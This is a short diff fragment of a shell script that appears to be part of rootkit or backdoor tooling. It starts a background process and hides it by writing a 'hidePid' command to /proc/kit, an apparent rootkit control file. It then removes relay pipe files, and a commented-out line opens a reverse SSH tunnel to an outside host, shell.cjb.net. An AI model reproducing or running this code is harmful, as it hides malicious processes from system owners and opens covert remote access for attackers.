@@ -20,7 +20,8 @@ backgroundPID=$!
 echo "hidePid $backgroundPID" > /proc/kit
 
 sleep 1
-rm file
+rm fromBash
+rm toBash
 
 #ssh -R 9012:localhost:$localPort kit100@shell.cjb.net 
 
